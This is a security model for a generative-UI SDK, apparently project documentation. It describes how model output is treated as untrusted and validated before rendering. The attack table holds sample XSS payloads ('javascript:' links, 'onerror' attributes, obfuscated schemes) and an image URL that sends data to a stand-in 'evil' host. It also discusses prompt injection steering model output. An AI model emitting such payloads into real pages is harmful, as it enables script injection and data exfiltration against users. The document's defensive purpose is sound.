# Security model

**Version**: 1.1 · **Date**: 2026-11-10 (1.0: 2026-09-29; 1.1 adds the browser, section 4.7)
**See also**: [Trust boundaries diagram](./diagrams/06-trust-boundaries.md) · [ADR-0001](./adr/0001-server-side-validation-boundary.md) · [ADR-0004](./adr/0004-closed-component-vocabulary.md) · [ADR-0011](./adr/0011-same-origin-trust-boundary.md) · [ADR-0010](./adr/0010-shadow-and-light-modes.md)

---

## 1. Why generative UI needs its own threat model

Conventional web security assumes the *developer* decides what renders. Generative
UI breaks that assumption: the structure of the page is chosen at request time by a
model that has just read retrieval context, user input and tool output — none of
which is trusted.

The XSS surface therefore moves from **"what the developer wrote"** to **"what the
model was persuaded to write"**. Input sanitisation does not address it, because the
dangerous content is not the input; it is the model's response to the input.

This document states what is defended, how, and — importantly — what is not.

---

## 2. Assets

| Asset | Why it matters |
|---|---|
| relaxAI API key | Direct financial cost and unmetered model access |
| Prompt content | May contain claims data, customer records, internal figures |
| Jurisdictional boundary | The compliance reason relaxAI was chosen at all |
| The rendered DOM | Script execution there is session compromise |
| Server availability | A generative endpoint is an expensive thing to have abused |

---

## 3. Adversaries

| Adversary | Capability |
|---|---|
| **Malicious end user** | Arbitrary request bodies; full control of their own browser and of any client-side code |
| **Content injector** | Controls text that reaches the model via retrieval, uploads or a third-party API |
| **Network observer** | Sees traffic between the application and relaxAI |
| **Curious insider** | Reads application logs and metrics |
| **Compromised dependency** | Runs code inside the server or browser bundle |

---

## 4. Controls

### 4.1 Credential handling

| Control | Implementation |
|---|---|
| Key never leaves the server | `RelaxClient` is constructed at module scope in a route handler; the React package has no code path that takes a key |
| Key absent → fail fast | Constructor throws `config_invalid` with a message telling you not to inline it client-side |
| Key never logged | `RelaxUIError.toJSON()` carries only code, status, requestId, strategy |
| Key never in an error body | HTTP error mapping copies the upstream message, not the request |

**Residual risk**: nothing stops an application putting the key in a
`NEXT_PUBLIC_` variable. The SDK cannot detect this. It is called out in the
quickstart and in `.env.example`.

### 4.2 Jurisdictional boundary (Principle I)

| Control | Implementation |
|---|---|
| Host allowlist | `assertSovereignEndpoint` runs in the client **constructor**, for every provider, so a misconfigured base URL fails the deploy rather than quietly exfiltrating prompts |
| Provider selection is explicit | relaxAI unless the application names another. An unregistered name is `config_invalid`; there is no fallback and no fail-over between providers ([ADR-0007](./adr/0007-provider-profiles-and-inference-interface.md)) |
| Local providers cannot reach out | Built-in local profiles allowlist loopback only. An environment variable can move the address but not widen the allowlist — only `sovereignty` in code can, and there are tests asserting both halves |
| Sovereignty is stated, and travels | A profile declares `sovereign`; only relaxAI's does. The provider id is in the stream's `meta` frame and in completion metadata, so an application can show it and a test can assert on it |
| No placeholder credentials | A keyless provider sends no `Authorization` header, rather than a dummy token that reads as a credential in a proxy log |
| TLS required | `http://` refused; the loopback exception requires an explicit opt-in **and** a loopback host — the opt-in cannot widen to a remote host, and there is a test asserting exactly that |
| No incidental egress | The SDK contacts only `/chat/completions` and `/models`. No telemetry, no version check, no error reporter |
| No runtime dependencies in core | Nothing else to audit on the egress path ([ADR-0003](./adr/0003-no-openai-sdk-dependency.md)) |
| Optional redaction | `redact()` is pure regex, deterministic, model-free, and reports what it matched so a deployment can alarm on it |

**Residual risk**: redaction is high-precision by design, so it under-matches
rather than mangling prose. It is a safety net, not a DLP product.

**Residual risk (providers)**: `sovereign` on an application-defined profile is
asserted, not verified — the SDK cannot check a jurisdictional claim. It has to
be written in code, where a reviewer sees it, and `defineProvider` refuses a
profile that claims sovereignty while permitting plaintext; that is the extent
of the control. A hand-written `InferenceClient` is trusted exactly as far as
the application that wrote it.

**Fail-fast really stops the upstream.** When a frame fails the schema
mid-stream, or the browser goes away, the response body from the inference
endpoint is *cancelled*, not merely no longer read. Before feature 002 the lock
was released and the connection left open, so the model kept generating — and
the endpoint kept billing — for output nobody would receive.

### 4.3 Model output as untrusted input (Principle IV)

This is the core of the model. Each row is a specific attack.

| Attack | Control | Where it fires |
|---|---|---|
| Emit `{"type":"script"}` | Type union closed at schema-construction time; no branch exists for an unregistered component | Server validation, then renderer again |
| Emit `{"type":"iframe","props":{"src":…}}` | Same | Same |
| Put `<img onerror=…>` in a text prop | Rendered as React text content; **no `dangerouslySetInnerHTML` exists anywhere in the SDK**, and CI greps for it | Render |
| `href: "javascript:alert(1)"` | `urlString()` is a `superRefine` + `transform`, so this fails **schema validation** — before a frame is sent | Server validation, then renderer |
| `java\0script:` / `java\tscript:` | Control characters rejected outright | URL guard |
| `data:text/html;base64,…` | Data URLs off by default; when enabled, the media type must be an allowlisted image | URL guard |
| Exfiltrate via `<img src="https://evil/?d=…">` | Optional `allowedHosts` on URL props | URL guard |
| Smuggle an event handler as a prop | `.strict()` objects: an unexpected key is a validation failure, not a silent drop | Server validation |
| 200,000-node tree (DoS) | Node and depth budgets, enforced by an **iterative** `measureTree` with a hard iteration cap | Server validation |
| Deeply nested tree to overflow the stack | The budget check is iterative *because* a recursive one overflows while measuring — the guard would fail before firing. Tested against a 200,000-deep tree | Server validation |
| Control characters in display text | `displayText()` rejects them | Server validation |

#### Why the renderer re-checks what the server already checked

The server's checks are load-bearing; the renderer's are not. They exist anyway
because a control living in exactly one layer is a control that a misconfiguration
silently removes — the realistic failure is a registry mismatched to a component
map, which is a configuration mistake, not an attack. The cost is a map lookup and
a `safeParse` per node.

### 4.4 Request-surface hardening

| Control | Implementation |
|---|---|
| Model not client-selectable | Fixed in the route's closure; the type signature makes the alternative unexpressible. Prevents cost abuse and model-shopping for a weaker safety posture |
| Schema not client-supplied | Same. A client-supplied schema is arbitrary structured extraction |
| System prompt not client-supplied | Same. A client-supplied system prompt is a jailbreak with a REST interface |
| Body validated before inference | `inputSchema.safeParse`; a failure is a 400 and costs zero tokens |
| Authorisation before inference | `authorize(request)` returning a `Response` short-circuits |
| Cancellation propagates | `request.signal` reaches relaxAI, so a closed tab stops the generation |
| Timeout ceiling | Default 120s per request |

There is a test asserting that a body containing `model` and `system` cannot
influence either.

### 4.5 Information disclosure

| Control | Implementation |
|---|---|
| Validation errors echo paths, not values | `redactIssues()` reduces issues to `{code, path}`; the route returns failing paths only. A failing value may be personal data |
| Wire frames carry no prompt or completion text | Protocol contract; `error.message` is SDK-authored |
| Metadata is log-safe | Strategy, downgrades, repair count, usage, duration — no content |
| Metrics cannot hold content | `MetricsCollector` accepts no string from the model; it counts |
| No SDK-side transport for any of it | Exporting is the application's explicit act |

### 4.6 Availability

| Control | Implementation |
|---|---|
| Document budgets | Bound parse and validation cost |
| Fail-fast on fatal issues | A wrong-typed field aborts the upstream generation rather than paying for the rest |
| Backpressure | `toSSEStream` pulls one event per `pull`, so a slow client slows the pipeline instead of buffering it |
| Bounded retries | 1 + `maxRetries`, full jitter so a fleet does not retry in lockstep |
| Bounded repairs | Default one round |
| Truncated repair echo | The model's prior output is capped at 8 KB so a runaway generation cannot blow the context |

**Residual risk**: no built-in rate limiting or quota. `authorize` is the seam;
quota policy belongs to the application.

### 4.7 The browser renders documents it did not ask for (feature 003)

Feature 003 lets a page render a document that never passed through this SDK's
server: a static JSON file, a stream from another service, a WebSocket message.
The server-side controls in 4.3 cannot have run on those. The browser therefore
carries the same controls, and decides for itself when it may skip them.

#### Who validates: the trust tier

| Source | Validation in the browser | Why |
|---|---|---|
| A URL on the page's own origin, with `validate="server"` | Not repeated; the validator's code is never downloaded | It is served by the application that served the page. If that is compromised, so is the page, and re-validating would protect nothing (research R4) |
| A same-origin URL without `validate="server"` | Full | The default |
| A URL on another origin | Full; `validate="server"` is **refused** | Another origin is someone else's server |
| A static document, a `ReadableStream`, a WebSocket | Full; `validate="server"` is **refused** | The browser cannot tell where it came from |

A refusal is `config_invalid`, raised before anything is fetched, listened to or
rendered, never a silent upgrade to full validation. A silent upgrade would hide
the mistake from whoever made it (Constitution IV, data model S1). Full
validation is the default; skipping it is the exception that must be asked for,
and is only granted where the origin check says it is safe.

What full validation checks in the browser is what the server checks:

- the closed component vocabulary;
- `.strict()` props, so an unexpected key is a failure;
- the URL guard;
- display-text control characters;
- the node budget and the depth budget.

A node that fails is not drawn and is reported with its field paths, never its
values. Its siblings still render.

#### What the renderer allows into the DOM

Whatever the validation tier, every renderer (the DOM backend, React, a
connector's output) passes through the same checks. The checks hold even if a
theme or connector misbehaves:

| Control | Implementation |
|---|---|
| Text is text | A string becomes a text node, never parsed. There is no code path from a string to markup; CI greps for every raw-HTML sink |
| Tag allowlist | `script`, `style`, `iframe`, `object`, `embed`, form controls, `template`, SVG `use`/`image`/`foreignObject`/animation are never created, whatever a template returns |
| Attribute allowlist | No `on*`, no `style`, no `srcdoc`, no `formaction` |
| URLs again | `href`, `src` and other URL attributes pass the URL guard at render time too, so a `server`-tier document cannot place `javascript:` in a link |
| Mounted framework components | They set their own attributes, out of the renderer's reach, so their `href`/`src` props pass the URL guard before the component sees them |
| Depth | The resolver refuses nodes past the depth limit before any implementation runs |

#### Connectors cannot widen what is accepted

A connector maps the contract onto a theme library. By construction it cannot
render a node outside the contract, skip validation, or turn model text into
markup (FR-238):

- `class` implementations only rename the base theme's classes;
- `element` implementations only replace the root tag with a custom element and
  set attributes from props, and `defineConnector` refuses `on*`, `style`,
  `href` and `src` mappings;
- `template` implementations return markup as data, checked like any other;
- framework components (React, Vue, Angular) receive validated props only, and
  never receive the model's children: the renderer draws those into a host the
  component merely places.

A connector whose library is missing is a configuration error naming the
library, not a blank screen.

#### Style isolation: `shadow` and `light`

`<gen-ui>` renders into a shadow root by default. The page's styles cannot reach
the document, and the document's styles cannot reach the page or another
instance; this is tested in Chromium in both directions.

`light` mode renders into the page's own DOM. Global theme libraries need it:
Bootstrap without an adopted sheet, and every framework library, because they
inject styles into `document.head`. **In light mode isolation is given up.** The
page's CSS can restyle the generated document, and selectors in it can reach the
document's elements. The base theme still only styles under `.gen-theme`.

The integrity controls above do not depend on the mode. Light mode trades away
style isolation, not validation or output safety. The risk is limited to
appearance, such as a page rule hiding or restyling a generated element, and
the page's author controls those rules.

#### Content Security Policy

The element, its lazy loading and every example work under `script-src 'self'`,
with no `unsafe-eval` and no `unsafe-inline`.

- **Lazy loading** is a plain `import()` of same-origin chunks.
- **Styles** are constructed stylesheets, adopted into each shadow root, not
  inline `<style>`.
- **Connector stylesheets** are fetched from the URLs the connector declares
  and adopted once per page.
- **Framework hosts** follow the same policy: the Vue example uses render
  functions with no template compiler, and the Angular example is compiled
  ahead of time and ships no compiler (tested). Angular's runtime component
  styles take a per-page nonce, not `unsafe-inline`.

---

## 5. What is deliberately not defended

Stated explicitly, because a security document that claims total coverage is
misleading.

| Not defended | Why |
|---|---|
| **Factual accuracy** | A schema constrains shape, not truth. A valid `Metric` can contain a fabricated number, and every control here will pass it. Mitigation is product-level: cite sources, instruct the model to say when it cannot justify a figure, keep a human in the loop for consequential figures |
| **Prompt injection changing *content*** | Injected text can change what the model says within the schema. The schema bounds the blast radius to "valid components with attacker-influenced text" — which is why the renderer treats all text as text |
| **A malicious application** | An application that registers a component rendering `dangerouslySetInnerHTML` from its own props has defeated the model. The SDK constrains the *model*, not the developer |
| **Model-side data leakage** | Whether relaxAI retains prompts is Civo's contract, not something an SDK can enforce. Redaction reduces exposure; it does not replace the contract |
| **Supply-chain compromise of Zod or React** | Out of scope. Core's zero runtime dependencies shrink the surface it contributes |
| **Client-side denial of self** | A user can make their own browser slow |
| **Page styles in `light` mode** | Light mode exists for libraries whose styles are global, and gives up style isolation in exchange (4.7). The page's own CSS can restyle or hide generated elements; it cannot run script or change what the document says |
| **A connector's library code** | A connector's library (Bootstrap, Shoelace, MUI, Element Plus, Angular Material) runs with the page's privileges. Its components receive validated props and text, but the SDK cannot audit what a library does with them. Choose libraries as you would any dependency |
| **A theme library's colour contrast** | The base theme meets WCAG 2.2 AA in every variant. A library's own palette is the library's: Shoelace's badges and Element Plus's defaults fall below 4.5:1 and were fixed, where possible, by the host's CSS |

---

## 6. Verification

| Property | How it is verified |
|---|---|
| No raw-HTML sink | `grep -rn 'dangerouslySetInnerHTML' packages` — CI-enforced, must be empty |
| No `node:` import in core | `grep -rn 'from "node:' packages/core/src` — CI-enforced |
| Core has no runtime dependencies | `packages/core/package.json` has no `dependencies` key — CI-enforced |
| Every guard refuses | `guards.test.ts` (19), `ui-contract.test.ts` (15), `renderer.test.tsx` (11) assert refusals, not just acceptances |
| Depth guard survives a pathological tree | `measureTree` tested against 200,000 levels |
| Request surface is fixed | `route.test.ts` asserts smuggled `model`/`system` are ignored and `authorize` short-circuits before any upstream call |
| Sovereignty opt-in cannot widen | Test asserts `allowInsecureTransport` still refuses a remote host |
| Browser trust tiers | `protocol/test/trust.test.ts` and the element's refusal tests: `validate="server"` with a document, a stream, a socket or another origin is `config_invalid`, and nothing is fetched or rendered; the server tier never loads the validator |
| Connector output safety | One conformance suite, run against the base theme, Bootstrap (light and shadow), Shoelace, MUI, Element Plus and Angular Material: markup in every text prop stays text, unknown types render nothing, `javascript:` links are refused in both tiers |
| No raw-HTML sink in the browser packages | The same CI grep covers `render`, `element` and the connectors |
| Style isolation | Chromium test: four elements with three themes on one page; nothing crosses a shadow boundary in either direction |
| CSP | Every example served with `script-src 'self'`; Playwright asserts no violation |

A guard tested only against valid input is not tested. Every control above has a
test that asserts the refusal path.

---

## 7. Deployment recommendations

1. Put the key in a server-only secret. Never `NEXT_PUBLIC_*`.
2. Set `allowedHosts` on URL props to the hosts you actually link to.
3. Turn `redaction` on, and alarm on `onRedaction` — a prompt that needed
   redacting means something upstream is passing data it should not.
4. Implement `authorize` with real authentication and a per-user quota.
5. Lower `maxNodes` and `maxDepth` to what your UI genuinely needs. The defaults
   (500 / 24) are generous.
6. Log `metadata` on every generation. A rising `repairAttempts` rate means the
   schema or prompt needs work; an unexpected `downgradedFrom` means a model's
   capabilities changed.
7. Review each registered component as a security boundary: it receives
   model-influenced props and decides what reaches the DOM.
8. In the browser, leave validation at its default unless the document comes
   from your own route on your own origin. Ship the validator lazily
   (`relax-ui-element` does) rather than switching it off.
9. Prefer `<gen-ui>`'s default `shadow` mode. Use `light` only for a library
   that needs it, and treat the page's CSS as able to touch the generated
   document.
10. Serve pages with `script-src 'self'`. Nothing in the SDK needs more.
